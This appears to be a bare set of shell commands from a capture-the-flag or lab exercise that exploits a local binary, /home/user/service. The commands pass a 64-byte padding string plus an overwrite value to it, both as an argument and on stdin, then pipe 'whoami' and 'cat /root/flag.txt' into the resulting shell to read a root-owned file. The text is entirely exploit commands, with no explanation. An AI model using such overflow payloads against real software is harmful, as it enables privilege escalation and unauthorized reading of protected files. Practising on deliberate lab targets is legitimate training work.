export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

(python3 -c "print('A'*64 + '22222222')"; echo "whoami"; echo "cat /root/flag.txt"; cat) | /home/user/service $(python3 -c "print('A'*64 + '22222222')")

/home/user/service "$(python3 -c "print('A'*64 + '22222222')") -p"

cat /root/flag.txt
